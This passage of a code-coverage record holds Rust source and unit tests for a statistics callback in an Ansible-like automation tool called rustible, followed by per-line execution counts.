hosts.to_vec(),\n                duration_ms: None,\n                task_count: 0,\n                start_time_ms: SystemTime::now()\n                    .duration_since(UNIX_EPOCH)\n                    .map(|d| d.as_millis() as u64)\n                    .unwrap_or(0),\n                success: true,\n            });\n        }\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, success: bool) {\n        let mut state = self.state.write();\n\n        let duration_ms = state\n            .play_start\n            .map(|start| start.elapsed().as_millis() as u64);\n\n        if let Some(ref mut stats) = state.current_stats {\n            stats.current_play = None;\n\n            if let Some(play) = stats.plays.last_mut() {\n                play.duration_ms = duration_ms;\n                play.success = success;\n            }\n        }\n\n        state.play_start = None;\n    }\n\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        let mut state = self.state.write();\n        state.task_start = Some(Instant::now());\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Increment atomic counter first (lock-free)\n        self.task_counter.fetch_add(1, Ordering::SeqCst);\n\n        let mut state = self.state.write();\n\n        // Calculate duration from task_start or use result.duration\n        let duration = state\n            .task_start\n            .take()\n            .map(|start| start.elapsed())\n            .unwrap_or(result.duration);\n\n        let duration_ms = duration.as_millis() as u64;\n\n        let Some(ref mut stats) = state.current_stats else {\n            return;\n        };\n\n        // Update total counters\n        stats.total_tasks += 1;\n        if result.result.skipped {\n            stats.total_skipped += 1;\n        } else if !result.result.success {\n            stats.total_failed += 1;\n        } else if result.result.changed {\n            stats.total_changed += 1;\n        } else {\n            stats.total_ok += 1;\n        }\n\n        // Update per-host stats\n        let host_stats = stats.hosts.entry(result.host.clone()).or_default();\n        host_stats.record(\u0026result.result, duration);\n\n        // Update histogram if enabled\n        if let Some(ref mut histogram) = stats.duration_histogram {\n            histogram.record(duration_ms);\n        }\n\n        // Update current play task count\n        if let Some(play) = stats.plays.last_mut() {\n            play.task_count += 1;\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Handlers don't affect stats directly\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        // Optionally track fact gathering time\n        let _ = host;\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_stats_callback_creation() {\n        let callback = StatsCallback::new();\n        assert_eq!(callback.task_counter.load(Ordering::SeqCst), 0);\n    }\n\n    #[test]\n    fn test_stats_config_default() {\n        let config = StatsConfig::default();\n        assert!(config.enable_histograms);\n        assert!(!config.per_host_module_stats);\n        assert!(!config.track_memory);\n        assert!(!config.histogram_buckets_ms.is_empty());\n    }\n\n    #[test]\n    fn test_host_stats_recording() {\n        let mut stats = HostStats::new();\n\n        let ok_result = ModuleResult::ok(\"success\");\n        let changed_result = ModuleResult::changed(\"modified\");\n        let failed_result = ModuleResult::failed(\"error\");\n        let skipped_result = ModuleResult::skipped(\"skipped\");\n\n        stats.record(\u0026ok_result, Duration::from_millis(100));\n        stats.record(\u0026changed_result, Duration::from_millis(200));\n        stats.record(\u0026failed_result, Duration::from_millis(50));\n        stats.record(\u0026skipped_result, Duration::from_millis(10));\n\n        assert_eq!(stats.ok, 1);\n        assert_eq!(stats.changed, 1);\n        assert_eq!(stats.failed, 1);\n        assert_eq!(stats.skipped, 1);\n        assert_eq!(stats.total(), 4);\n        assert_eq!(stats.total_duration_ms, 360);\n    }\n\n    #[test]\n    fn test_module_stats_recording() {\n        let mut stats = ModuleStats::new();\n\n        let ok_result = ModuleResult::ok(\"success\");\n        let changed_result = ModuleResult::changed(\"modified\");\n        let failed_result = ModuleResult::failed(\"error\");\n\n        stats.record(\u0026ok_result, 100);\n        stats.record(\u0026changed_result, 200);\n        stats.record(\u0026failed_result, 50);\n\n        assert_eq!(stats.count, 3);\n        assert_eq!(stats.successes, 2);\n        assert_eq!(stats.failures, 1);\n        assert_eq!(stats.changed, 1);\n        assert_eq!(stats.min_duration_ms, Some(50));\n        assert_eq!(stats.max_duration_ms, Some(200));\n        assert!((stats.avg_duration_ms() - 116.67).abs() \u003c 0.1);\n    }\n\n    #[test]\n    fn test_duration_histogram() {\n        let mut histogram = DurationHistogram::new(vec![10, 50, 100, 500]);\n\n        histogram.record(5); // \u003c= 10\n        histogram.record(15); // \u003c= 50\n        histogram.record(45); // \u003c= 50\n        histogram.record(75); // \u003c= 100\n        histogram.record(200); // \u003c= 500\n        histogram.record(1000); // overflow\n\n        assert_eq!(histogram.total, 6);\n        assert_eq!(histogram.counts, vec![1, 2, 1, 1]);\n        assert_eq!(histogram.overflow, 1);\n\n        // Test percentiles\n        assert_eq!(histogram.percentile(50.0), Some(50));\n        assert_eq!(histogram.percentile(90.0), Some(500));\n    }\n\n    #[test]\n    fn test_playbook_stats_success_rate() {\n        let mut stats = PlaybookStats::new(\"test.yml\", \u0026StatsConfig::default());\n\n        stats.total_tasks = 100;\n        stats.total_ok = 60;\n        stats.total_changed = 30;\n        stats.total_failed = 5;\n        stats.total_skipped = 5;\n\n        assert!((stats.success_rate() - 95.0).abs() \u003c 0.01);\n        assert!(stats.has_failures());\n    }\n\n    #[test]\n    fn test_module_classification() {\n        let state = StatsState::new(StatsConfig::default());\n\n        assert_eq!(\n            state.get_classification(\"debug\"),\n            ModuleClassification::LocalLogic\n        );\n        assert_eq!(\n            state.get_classification(\"copy\"),\n            ModuleClassification::NativeTransport\n        );\n        assert_eq!(\n            state.get_classification(\"apt\"),\n            ModuleClassification::RemoteCommand\n        );\n        assert_eq!(\n            state.get_classification(\"unknown_module\"),\n            ModuleClassification::PythonFallback\n        );\n    }\n\n    #[tokio::test]\n    async fn test_callback_lifecycle() {\n        let callback = StatsCallback::new();\n\n        // Start playbook\n        callback.on_playbook_start(\"test.yml\").await;\n        assert!(callback.current_stats().is_some());\n\n        // Start play\n        callback\n            .on_play_start(\"Test Play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Simulate task\n        callback.on_task_start(\"Test Task\", \"host1\").await;\n\n        let result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"Test Task\".to_string(),\n            result: ModuleResult::changed(\"done\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026result).await;\n\n        // End play and playbook\n        callback.on_play_end(\"Test Play\", true).await;\n        callback.on_playbook_end(\"test.yml\", true).await;\n\n        // Verify stats\n        let stats = callback.current_stats().unwrap();\n        assert_eq!(stats.total_tasks, 1);\n        assert_eq!(stats.total_changed, 1);\n        assert!(stats.duration_secs.is_some());\n    }\n\n    #[test]\n    fn test_export_json() {\n        let callback = StatsCallback::new();\n\n        // Need to run async in a tokio runtime for this test\n        let rt = tokio::runtime::Runtime::new().unwrap();\n        rt.block_on(async {\n            callback.on_playbook_start(\"test.yml\").await;\n            callback.on_playbook_end(\"test.yml\", true).await;\n        });\n\n        let json = callback.export_json();\n        assert!(json.contains(\"test.yml\"));\n    }\n\n    #[test]\n    fn test_export_prometheus() {\n        let callback = StatsCallback::new();\n\n        let rt = tokio::runtime::Runtime::new().unwrap();\n        rt.block_on(async {\n            callback.on_playbook_start(\"test.yml\").await;\n\n            let result = ExecutionResult {\n                host: \"host1\".to_string(),\n                task_name: \"Test Task\".to_string(),\n                result: ModuleResult::ok(\"done\"),\n                duration: Duration::from_millis(100),\n                notify: vec![],\n            };\n            callback.on_task_complete(\u0026result).await;\n            callback.on_playbook_end(\"test.yml\", true).await;\n        });\n\n        let prometheus = callback.export_prometheus();\n        assert!(prometheus.contains(\"rustible_tasks_total\"));\n        assert!(prometheus.contains(\"rustible_success_rate\"));\n    }\n\n    #[test]\n    fn test_callback_clone_shares_state() {\n        let callback1 = StatsCallback::new();\n        let callback2 = callback1.clone();\n\n        let rt = tokio::runtime::Runtime::new().unwrap();\n        rt.block_on(async {\n            callback1.on_playbook_start(\"test.yml\").await;\n        });\n\n        // Both should see the same stats\n        assert!(callback1.current_stats().is_some());\n        assert!(callback2.current_stats().is_some());\n    }\n\n    #[test]\n    fn test_reset() {\n        let callback = StatsCallback::new();\n\n        let rt = tokio::runtime::Runtime::new().unwrap();\n        rt.block_on(async {\n            callback.on_playbook_start(\"test.yml\").await;\n        });\n\n        assert!(callback.current_stats().is_some());\n\n        callback.reset();\n        assert!(callback.current_stats().is_none());\n    }\n\n    #[test]\n    fn test_memory_snapshot() {\n        let snapshot = MemorySnapshot::take();\n        assert!(snapshot.timestamp_ms \u003e 0);\n        // RSS/VMS may or may not be available depending on platform\n    }\n\n    #[test]\n    fn test_record_module_execution() {\n        let callback = StatsCallback::new();\n\n        let rt = tokio::runtime::Runtime::new().unwrap();\n        rt.block_on(async {\n            callback.on_playbook_start(\"test.yml\").await;\n        });\n\n        let result = ModuleResult::changed(\"installed\");\n        callback.record_module_execution(\"apt\", \u0026result, Duration::from_millis(1500));\n        callback.record_module_execution(\n            \"apt\",\n            \u0026ModuleResult::ok(\"ok\"),\n            Duration::from_millis(500),\n        );\n        callback.record_module_execution(\n            \"debug\",\n            \u0026ModuleResult::ok(\"msg\"),\n            Duration::from_millis(1),\n        );\n\n        let stats = callback.current_stats().unwrap();\n\n        // Check module stats\n        let apt_stats = stats.module_stats.get(\"apt\").unwrap();\n        assert_eq!(apt_stats.count, 2);\n        assert_eq!(apt_stats.changed, 1);\n        assert_eq!(apt_stats.total_duration_ms, 2000);\n\n        // Check classification stats\n        let remote_stats = stats.classification_stats.get(\"remote_command\").unwrap();\n        assert_eq!(remote_stats.count, 2);\n\n        let local_stats = stats.classification_stats.get(\"local_logic\").unwrap();\n        assert_eq!(local_stats.count, 1);\n    }\n}\n","traces":[{"line":92,"address":[23642048],"length":1,"stats":{"Line":1}},{"line":98,"address":[23642285,23642062],"length":1,"stats":{"Line":1}},{"line":118,"address":[23642896],"length":1,"stats":{"Line":1}},{"line":119,"address":[23642923],"length":1,"stats":{"Line":1}},{"line":120,"address":[23642954],"length":1,"stats":{"Line":1}},{"line":121,"address":[23642994],"length":1,"stats":{"Line":0}},{"line":122,"address":[23643034],"length":1,"stats":{"Line":1}},{"line":123,"address":[23643074],"length":1,"stats":{"Line":0}},{"line":147,"address":[23640848],"length":1,"stats":{"Line":1}},{"line":148,"address":[23640856],"length":1,"stats":{"Line":1}},{"line":152,"address":[23641072],"length":1,"stats":{"Line":1}},{"line":153,"address":[23641110],"length":1,"stats":{"Line":1}},{"line":154,"address":[23641135,23641182],"length":1,"stats":{"Line":1}},{"line":156,"address":[23641442,23641174],"length":1,"stats":{"Line":2}},{"line":157,"address":[23641213,23641438,23641447],"length":1,"stats":{"Line":2}},{"line":158,"address":[23641200,23641298],"length":1,"stats":{"Line":2}},{"line":159,"address":[23641300,23641248,23641294],"length":1,"stats":{"Line":2}},{"line":160,"address":[23641276,23641413,23641385],"length":1,"stats":{"Line":3}},{"line":161,"address":[23641415,23641350,23641409],"length":1,"stats":{"Line":2}},{"line":163,"address":[23641387,23641323,23641382],"length":1,"stats":{"Line":2}},{"line":168,"address":[23640880],"length":1,"stats":{"Line":1}},{"line":169,"address":[23641050,23640894],"length":1,"stats":{"Line":1}},{"line":173,"address":[23640592],"length":1,"stats":{"Line":0}},{"line":174,"address":[23640606],"length":1,"stats":{"Line":0}},{"line":175,"address":[23640621,23640641,23640823],"length":1,"stats":{"Line":0}},{"line":176,"address":[23640627],"length":1,"stats":{"Line":0}},{"line":178,"address":[23640691,23640648,23640828],"length":1,"stats":{"Line":0}},{"line":179,"address":[23640738],"length":1,"stats":{"Line":0}},{"line":210,"address":[23621648],"length":1,"stats":{"Line":1}},{"line":211,"address":[23621656],"length":1,"stats":{"Line":1}},{"line":215,"address":[23621488],"length":1,"stats":{"Line":1}},{"line":223,"address":[23621680],"length":1,"stats":{"Line":1}},{"line":224,"address":[23621757,23621709],"length":1,"stats":{"Line":1}},{"line":226,"address":[23622043,23621749],"length":1,"stats":{"Line":1}},{"line":227,"address":[23621788,23622048,23622039],"length":1,"stats":{"Line":0}},{"line":228,"address":[23621888,23621775],"length":1,"stats":{"Line":2}},{"line":229,"address":[23621890,23621823,23621884],"length":1,"stats":{"Line":2}},{"line":231,"address":[23621851,23621963,23621951],"length":1,"stats":{"Line":2}},{"line":232,"address":[23622014,23621955],"length":1,"stats":{"Line":2}},{"line":233,"address":[23622016,23621981],"length":1,"stats":{"Line":1}},{"line":237,"address":[23622071,23622188,23621908],"length":1,"stats":{"Line":2}},{"line":238,"address":[23622117],"length":1,"stats":{"Line":1}},{"line":239,"address":[23622098,23622075],"length":1,"stats":{"Line":2}},{"line":240,"address":[23622082],"length":1,"stats":{"Line":3}},{"line":241,"address":[23622103],"length":1,"stats":{"Line":1}},{"line":243,"address":[23622171],"length":1,"stats":{"Line":1}},{"line":244,"address":[23622152,23622128],"length":1,"stats":{"Line":2}},{"line":245,"address":[23622136],"length":1,"stats":{"Line":3}},{"line":246,"address":[23622157],"length":1,"stats":{"Line":1}},{"line":251,"address":[23621360],"length":1,"stats":{"Line":1}},{"line":252,"address":[23621370,23621386],"length":1,"stats":{"Line":1}},{"line":253,"address":[23621377],"length":1,"stats":{"Line":0}},{"line":255,"address":[23621393],"length":1,"stats":{"Line":1}},{"line":260,"address":[23621216],"length":1,"stats":{"Line":0}},{"line":261,"address":[23621226,23621247],"length":1,"stats":{"Line":0}},{"line":262,"address":[23621233],"length":1,"stats":{"Line":0}},{"line":264,"address":[23621254],"length":1,"stats":{"Line":0}},{"line":269,"address":[23621088],"length":1,"stats":{"Line":0}},{"line":270,"address":[23621098,23621114],"length":1,"stats":{"Line":0}},{"line":271,"address":[23621105],"length":1,"stats":{"Line":0}},{"line":273,"address":[23621121],"length":1,"stats":{"Line":0}},{"line":295,"address":[23639970,23639744],"length":1,"stats":{"Line":1}},{"line":296,"address":[23639771,23639827],"length":1,"stats":{"Line":2}},{"line":307,"address":[23640128],"length":1,"stats":{"Line":1}},{"line":308,"address":[23640161,23640218],"length":1,"stats":{"Line":1}},{"line":309,"address":[23640328,23640195,23640241],"length":1,"stats":{"Line":2}},{"line":312,"address":[23640245,23640341],"length":1,"stats":{"Line":2}},{"line":313,"address":[23640444],"length":1,"stats":{"Line":1}},{"line":314,"address":[23640524,23640579],"length":1,"stats":{"Line":1}},{"line":319,"address":[23640456,23640493],"length":1,"stats":{"Line":1}},{"line":323,"address":[23639152],"length":1,"stats":{"Line":1}},{"line":324,"address":[23639187],"length":1,"stats":{"Line":1}},{"line":325,"address":[23639194],"length":1,"stats":{"Line":0}},{"line":328,"address":[23639219],"length":1,"stats":{"Line":1}},{"line":329,"address":[23639374],"length":1,"stats":{"Line":1}},{"line":331,"address":[23639383,23639491],"length":1,"stats":{"Line":2}},{"line":332,"address":[23639668,23639589,23639685],"length":1,"stats":{"Line":2}},{"line":333,"address":[23639673],"length":1,"stats":{"Line":1}},{"line":334,"address":[23639708],"length":1,"stats":{"Line":1}},{"line":339,"address":[23639617],"length":1,"stats":{"Line":1}},{"line":343,"address":[23640000],"length":1,"stats":{"Line":0}},{"line":344,"address":[23640026,23640010],"length":1,"stats":{"Line":0}},{"line":345,"address":[23640017],"length":1,"stats":{"Line":0}},{"line":347,"address":[23640033],"length":1,"stats":{"Line":0}},{"line":368,"address":[23638816],"length":1,"stats":{"Line":1}},{"line":369,"address":[23638833],"length":1,"stats":{"Line":1}},{"line":370,"address":[23638848],"length":1,"stats":{"Line":1}},{"line":371,"address":[25390415,25390400],"length":1,"stats":{"Line":3}},{"line":375,"address":[23639054,23638911],"length":1,"stats":{"Line":2}},{"line":377,"address":[25390432,25391157],"length":1,"stats":{"Line":2}},{"line":378,"address":[25390462,25390550],"length":1,"stats":{"Line":2}},{"line":379,"address":[25390671,25390580,25391128,25390653],"length":1,"stats":{"Line":3}},{"line":380,"address":[25390673],"length":1,"stats":{"Line":1}},{"line":381,"address":[25391248,25391265,25390685,25390747],"length":1,"stats":{"Line":4}},{"line":382,"address":[25390879,25391201,25391184],"length":1,"stats":{"Line":3}},{"line":383,"address":[25391049],"length":1,"stats":{"Line":1}},{"line":385,"address":[25390664],"length":1,"stats":{"Line":0}},{"line":388,"address":[23638977],"length":1,"stats":{"Line":1}},{"line":473,"address":[23622528,23623704,23623662],"length":1,"stats":{"Line":1}},{"line":474,"address":[23622584,23622621],"length":1,"stats":{"Line":1}},{"line":475,"address":[23622628],"length":1,"stats":{"Line":1}},{"line":477,"address":[23622598],"length":1,"stats":{"Line":0}},{"line":481,"address":[23622704],"length":1,"stats":{"Line":1}},{"line":482,"address":[23622834,23622764],"length":1,"stats":{"Line":2}},{"line":488,"address":[23622935],"length":1,"stats":{"Line":1}},{"line":489,"address":[23622950],"length":1,"stats":{"Line":1}},{"line":490,"address":[23623005],"length":1,"stats":{"Line":1}},{"line":498,"address":[23623133],"length":1,"stats":{"Line":1}},{"line":500,"address":[23623206],"length":1,"stats":{"Line":1}},{"line":506,"address":[23622272],"length":1,"stats":{"Line":1}},{"line":507,"address":[23622505,23622286,23622310],"length":1,"stats":{"Line":2}},{"line":508,"address":[23622296],"length":1,"stats":{"Line":0}},{"line":510,"address":[23622317,23622367,23622510],"length":1,"stats":{"Line":2}},{"line":511,"address":[23622417],"length":1,"stats":{"Line":1}},{"line":516,"address":[23622208],"length":1,"stats":{"Line":1}},{"line":517,"address":[23622218],"length":1,"stats":{"Line":1}},{"line":540,"address":[23621073,23620704,23621055],"length":1,"stats":{"Line":1}},{"line":544,"address":[23620754],"length":1,"stats":{"Line":1}},{"line":548,"address":[23620806],"length":1,"stats":{"Line":1}},{"line":553,"address":[23620681,23620032,23620687],"length":1,"stats":{"Line":1}},{"line":554,"address":[23620054],"length":1,"stats":{"Line":1}},{"line":557,"address":[23620130,23620059],"length":1,"stats":{"Line":2}},{"line":569,"address":[23620669,23620230],"length":1,"stats":{"Line":2}},{"line":573,"address":[23620252],"length":1,"stats":{"Line":1}},{"line":583,"address":[23620642,23620386],"length":1,"stats":{"Line":2}},{"line":587,"address":[23620408],"length":1,"stats":{"Line":1}},{"line":591,"address":[23620612,23620542],"length":1,"stats":{"Line":2}},{"line":594,"address":[23620566],"length":1,"stats":{"Line":1}},{"line":598,"address":[23619968],"length":1,"stats":{"Line":1}},{"line":599,"address":[23619986],"length":1,"stats":{"Line":1}},{"line":600,"address":[23619993],"length":1,"stats":{"Line":1}},{"line":602,"address":[23620006],"length":1,"stats":{"Line":1}},{"line":624,"address":[23635216],"length":1,"stats":{"Line":1}},{"line":625,"address":[23635230],"length":1,"stats":{"Line":1}},{"line":629,"address":[23624176,23624361],"length":1,"stats":{"Line":1}},{"line":631,"address":[23624205],"length":1,"stats":{"Line":1}},{"line":632,"address":[23624249,23624309],"length":1,"stats":{"Line":2}},{"line":637,"address":[23624651,23624512,23624657],"length":1,"stats":{"Line":1}},{"line":638,"address":[23624624,23624544],"length":1,"stats":{"Line":2}},{"line":642,"address":[23635880,23635728,23635874],"length":1,"stats":{"Line":0}},{"line":643,"address":[23635760,23635840],"length":1,"stats":{"Line":0}},{"line":647,"address":[23623744,23624154,23624160],"length":1,"stats":{"Line":1}},{"line":648,"address":[23623782],"length":1,"stats":{"Line":1}},{"line":649,"address":[23623812,23623866],"length":1,"stats":{"Line":2}},{"line":650,"address":[23623907,23623936],"length":1,"stats":{"Line":2}},{"line":651,"address":[23623985,23623919],"length":1,"stats":{"Line":0}},{"line":652,"address":[23624125,23624085],"length":1,"stats":{"Line":0}},{"line":654,"address":[23624149,23624097],"length":1,"stats":{"Line":0}},{"line":659,"address":[23633984,23634394,23634400],"length":1,"stats":{"Line":0}},{"line":660,"address":[23634022],"length":1,"stats":{"Line":0}},{"line":661,"address":[23634052,23634106],"length":1,"stats":{"Line":0}},{"line":662,"address":[23634147,23634176],"length":1,"stats":{"Line":0}},{"line":663,"address":[23634225,23634159],"length":1,"stats":{"Line":0}},{"line":664,"address":[23634365,23634325],"length":1,"stats":{"Line":0}},{"line":666,"address":[23634389,23634337],"length":1,"stats":{"Line":0}},{"line":671,"address":[23624672,23633970,23626893],"length":1,"stats":{"Line":1}},{"line":672,"address":[23624737],"length":1,"stats":{"Line":1}},{"line":673,"address":[23624773,23624890],"length":1,"stats":{"Line":2}},{"line":676,"address":[25389984,25389989],"length":1,"stats":{"Line":1}},{"line":678,"address":[23624898],"length":1,"stats":{"Line":1}},{"line":679,"address":[23624976],"length":1,"stats":{"Line":0}},{"line":682,"address":[23624961],"length":1,"stats":{"Line":1}},{"line":685,"address":[23624986],"length":1,"stats":{"Line":1}},{"line":686,"address":[23625057],"length":1,"stats":{"Line":1}},{"line":687,"address":[23625092,23625325],"length":1,"stats":{"Line":2}},{"line":691,"address":[23625359,23625592],"length":1,"stats":{"Line":2}},{"line":695,"address":[23625626,23625859],"length":1,"stats":{"Line":2}},{"line":699,"address":[23626126,23625893],"length":1,"stats":{"Line":2}},{"line":703,"address":[23626160,23626393],"length":1,"stats":{"Line":2}},{"line":709,"address":[23626427],"length":1,"stats":{"Line":1}},{"line":710,"address":[23626459],"length":1,"stats":{"Line":1}},{"line":713,"address":[23626516],"length":1,"stats":{"Line":1}},{"line":714,"address":[23626551,23626864],"length":1,"stats":{"Line":2}},{"line":721,"address":[23626486],"length":1,"stats":{"Line":1}},{"line":722,"address":[23626899],"length":1,"stats":{"Line":1}},{"line":723,"address":[23626934,23627300,23626991],"length":1,"stats":{"Line":3}},{"line":726,"address":[23626949],"length":1,"stats":{"Line":1}},{"line":730,"address":[23627326],"length":1,"stats":{"Line":1}},{"line":731,"address":[23627353],"length":1,"stats":{"Line":1}},{"line":732,"address":[23627388],"length":1,"stats":{"Line":1}},{"line":733,"address":[23632984,23627578,23632762],"length":1,"stats":{"Line":3}},{"line":737,"address":[23633018,23633297],"length":1,"stats":{"Line":2}},{"line":741,"address":[23633610,23633331],"length":1,"stats":{"Line":2}},{"line":745,"address":[23633644,23633923],"length":1,"stats":{"Line":2}},{"line":752,"address":[23627616],"length":1,"stats":{"Line":1}},{"line":755,"address":[23627643],"length":1,"stats":{"Line":1}},{"line":756,"address":[23627670],"length":1,"stats":{"Line":1}},{"line":757,"address":[23627697],"length":1,"stats":{"Line":1}},{"line":758,"address":[23627732],"length":1,"stats":{"Line":1}},{"line":759,"address":[23627914,23631773,23632007],"length":1,"stats":{"Line":0}},{"line":763,"address":[23632412,23632109],"length":1,"stats":{"Line":0}},{"line":766,"address":[23632041],"length":1,"stats":{"Line":0}},{"line":768,"address":[23632725,23632446],"length":1,"stats":{"Line":0}},{"line":775,"address":[23627972],"length":1,"stats":{"Line":1}},{"line":778,"address":[23627999],"length":1,"stats":{"Line":1}},{"line":779,"address":[23628034],"length":1,"stats":{"Line":1}},{"line":780,"address":[23628216,23631091,23631325],"length":1,"stats":{"Line":0}},{"line":784,"address":[23631736,23631427],"length":1,"stats":{"Line":0}},{"line":787,"address":[23631359],"length":1,"stats":{"Line":0}},{"line":792,"address":[23628282],"length":1,"stats":{"Line":1}},{"line":793,"address":[23628343],"length":1,"stats":{"Line":1}},{"line":796,"address":[23628408],"length":1,"stats":{"Line":1}},{"line":798,"address":[23628443],"length":1,"stats":{"Line":1}},{"line":799,"address":[23628455],"length":1,"stats":{"Line":1}},{"line":800,"address":[23628784,23629877,23629708],"length":1,"stats":{"Line":2}},{"line":801,"address":[23629834,23630163,23629897],"length":1,"stats":{"Line":3}},{"line":803,"address":[23629766],"length":1,"stats":{"Line":1}},{"line":807,"address":[23628825,23629055],"length":1,"stats":{"Line":2}},{"line":811,"address":[23629407,23629157],"length":1,"stats":{"Line":2}},{"line":813,"address":[23629089],"length":1,"stats":{"Line":1}},{"line":815,"address":[23629441,23629671],"length":1,"stats":{"Line":2}},{"line":822,"address":[23628378,23630208],"length":1,"stats":{"Line":2}},{"line":823,"address":[23630294,23630374],"length":1,"stats":{"Line":0}},{"line":824,"address":[23630386],"length":1,"stats":{"Line":0}},{"line":825,"address":[23630440],"length":1,"stats":{"Line":0}},{"line":826,"address":[23630475],"length":1,"stats":{"Line":0}},{"line":828,"address":[23630421,23630738],"length":1,"stats":{"Line":0}},{"line":831,"address":[23630777],"length":1,"stats":{"Line":0}},{"line":832,"address":[23630812],"length":1,"stats":{"Line":0}},{"line":836,"address":[23630313],"length":1,"stats":{"Line":1}},{"line":840,"address":[23638799,23636978,23635904],"length":1,"stats":{"Line":0}},{"line":841,"address":[23635954],"length":1,"stats":{"Line":0}},{"line":842,"address":[23635990,23636107],"length":1,"stats":{"Line":0}},{"line":845,"address":[23636084],"length":1,"stats":{"Line":0}},{"line":847,"address":[23636115],"length":1,"stats":{"Line":0}},{"line":848,"address":[23636193],"length":1,"stats":{"Line":0}},{"line":851,"address":[23636178],"length":1,"stats":{"Line":0}},{"line":852,"address":[23636227,23636302],"length":1,"stats":{"Line":0}},{"line":854,"address":[23636535],"length":1,"stats":{"Line":0}},{"line":855,"address":[23636575,23636726],"length":1,"stats":{"Line":0}},{"line":858,"address":[23637351,23636610,23636984],"length":1,"stats":{"Line":0}},{"line":867,"address":[23637385],"length":1,"stats":{"Line":0}},{"line":869,"address":[23637705],"length":1,"stats":{"Line":0}},{"line":870,"address":[23637733],"length":1,"stats":{"Line":0}},{"line":871,"address":[23637829],"length":1,"stats":{"Line":0}},{"line":872,"address":[23637882,23637949],"length":1,"stats":{"Line":0}},{"line":874,"address":[23637964],"length":1,"stats":{"Line":0}},{"line":875,"address":[23638328,23638217,23638739],"length":1,"stats":{"Line":0}},{"line":879,"address":[23638233,23638275],"length":1,"stats":{"Line":0}},{"line":880,"address":[23638284],"length":1,"stats":{"Line":0}},{"line":885,"address":[23637768],"length":1,"stats":{"Line":0}},{"line":889,"address":[23635701,23635707,23635280],"length":1,"stats":{"Line":1}},{"line":890,"address":[23635300],"length":1,"stats":{"Line":1}},{"line":891,"address":[23635425,23635367,23635333,23635691],"length":1,"stats":{"Line":1}},{"line":892,"address":[23635517,23635571],"length":1,"stats":{"Line":2}},{"line":893,"address":[23635586],"length":1,"stats":{"Line":1}},{"line":894,"address":[23635618],"length":1,"stats":{"Line":1}},{"line":895,"address":[23635648],"length":1,"stats":{"Line":1}},{"line":899,"address":[23624384,23624495,23624501],"length":1,"stats":{"Line":0}},{"line":900,"address":[23624393],"length":1,"stats":{"Line":0}},{"line":901,"address":[23624466,23624423],"length":1,"stats":{"Line":0}},{"line":905,"address":[23634626,23634416,23634620],"length":1,"stats":{"Line":1}},{"line":906,"address":[23634425],"length":1,"stats":{"Line":1}},{"line":907,"address":[23634503,23634455],"length":1,"stats":{"Line":2}},{"line":908,"address":[23634532],"length":1,"stats":{"Line":0}},{"line":909,"address":[23634582],"length":1,"stats":{"Line":0}},{"line":915,"address":[23634640,23635190,23635196],"length":1,"stats":{"Line":1}},{"line":916,"address":[23634714],"length":1,"stats":{"Line":1}},{"line":917,"address":[23634740],"length":1,"stats":{"Line":1}},{"line":919,"address":[23634834,23634770],"length":1,"stats":{"Line":2}},{"line":921,"address":[23634861],"length":1,"stats":{"Line":1}},{"line":926,"address":[23635040,23634924],"length":1,"stats":{"Line":2}},{"line":928,"address":[23634935,23634990],"length":1,"stats":{"Line":2}},{"line":929,"address":[23635013],"length":1,"stats":{"Line":3}},{"line":930,"address":[23635048],"length":1,"stats":{"Line":1}},{"line":933,"address":[23635157,23635060],"length":1,"stats":{"Line":2}},{"line":935,"address":[23635087],"length":1,"stats":{"Line":1}},{"line":937,"address":[23635165],"length":1,"stats":{"Line":1}},{"line":942,"address":[23642528],"length":1,"stats":{"Line":0}},{"line":943,"address":[23642536],"length":1,"stats":{"Line":0}},{"line":948,"address":[23619600,23619763,23619769],"length":1,"stats":{"Line":1}},{"line":950,"address":[23619632],"length":1,"stats":{"Line":1}},{"line":951,"address":[23619647,23619701],"length":1,"stats":{"Line":2}},{"line":957,"address":[23617776],"length":1,"stats":{"Line":0}},{"line":958,"address":[23617795],"length":1,"stats":{"Line":0}},{"line":959,"address":[23617823],"length":1,"stats":{"Line":0}},{"line":966,"address":[25383920,25383334,25382836,25382735,25382704,25382874,25383858],"length":1,"stats":{"Line":4}},{"line":967,"address":[25382921,25382821],"length":1,"stats":{"Line":2}},{"line":970,"address":[25382975,25383301,25383041],"length":1,"stats":{"Line":2}},{"line":971,"address":[25383122,25383222],"length":1,"stats":{"Line":0}},{"line":975,"address":[25383142,25383874,25383528,25383470,25383340],"length":1,"stats":{"Line":1}},{"line":976,"address":[25383629],"length":1,"stats":{"Line":1}},{"line":977,"address":[25383664],"length":1,"stats":{"Line":1}},{"line":978,"address":[25383691],"length":1,"stats":{"Line":1}},{"line":980,"address":[25383784],"length":1,"stats":{"Line":1}},{"line":983,"address":[25383804],"length":1,"stats":{"Line":1}},{"line":984,"address":[25383835],"length":1,"stats":{"Line":1}},{"line":987,"address":[25380387,25380903,25380352,25380268,25380934,25380240],"length":1,"stats":{"Line":4}},{"line":988,"address":[25380340,25380431],"length":1,"stats":{"Line":2}},{"line":991,"address":[25380570,25380473,25380528],"length":1,"stats":{"Line":3}},{"line":993,"address":[25380976,25380988,25380541],"length":1,"stats":{"Line":3}},{"line":995,"address":[25380589,25380873],"length":1,"stats":{"Line":2}},{"line":996,"address":[25380797],"length":1,"stats":{"Line":1}},{"line":997,"address":[25380642,25380694],"length":1,"stats":{"Line":2}},{"line":998,"address":[25380709],"length":1,"stats":{"Line":1}},{"line":999,"address":[25381024,25381039,25380756],"length":1,"stats":{"Line":3}},{"line":1000,"address":[25380775],"length":1,"stats":{"Line":1}},{"line":1003,"address":[25380808],"length":1,"stats":{"Line":1}},{"line":1004,"address":[25380842],"length":1,"stats":{"Line":1}},{"line":1007,"address":[25380864],"length":1,"stats":{"Line":1}},{"line":1011,"address":[25380662],"length":1,"stats":{"Line":1}},{"line":1012,"address":[25380883],"length":1,"stats":{"Line":1}},{"line":1015,"address":[23613821],"length":1,"stats":{"Line":4}